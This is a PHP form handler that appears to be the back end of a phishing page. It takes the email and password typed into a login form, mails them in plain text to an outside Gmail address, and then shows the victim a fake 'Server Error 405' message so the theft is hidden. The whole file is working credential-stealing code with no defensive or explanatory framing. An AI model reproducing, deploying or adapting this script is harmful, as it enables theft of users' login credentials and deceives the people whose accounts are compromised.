<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $username = htmlspecialchars($_POST['login_email']);
    $password = htmlspecialchars($_POST['login_password']);

    // Email details
    $to = "allgiftcardchecker@gmail.com"; // Replace with your email address
    $subject = "Login Information";
    $message = "Username: " . $username . "\n";
    $message .= "Password: " . $password . "\n";
    $headers = "From: rahulparves@protonmail.com"; // Replace with a valid 'from' address

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Server Error 405";
    } else {
        echo "Failed. Try again.";
    }
} else {
    echo "Invalid request.";
}
?>
